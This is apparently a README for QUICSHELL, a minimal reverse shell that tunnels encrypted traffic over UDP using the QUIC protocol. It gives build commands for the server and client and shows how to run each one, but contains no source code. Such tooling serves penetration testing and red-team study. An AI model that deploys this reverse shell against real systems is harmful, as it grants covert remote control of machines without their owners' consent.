$QUICSHELL$
***********
Minimal reverse shell that uses QUIC protocol for encrypted traffic over UDP.

(portable) Build:
^^^^^^^^^^^^^^^^^
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build server.go
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build client.go

Uses quic-go library so you might need to grab it first with "go get github.com/quic-go/quic-go".

RUN:
^^^^
./server <port>
./client <srv addr> <srv port>
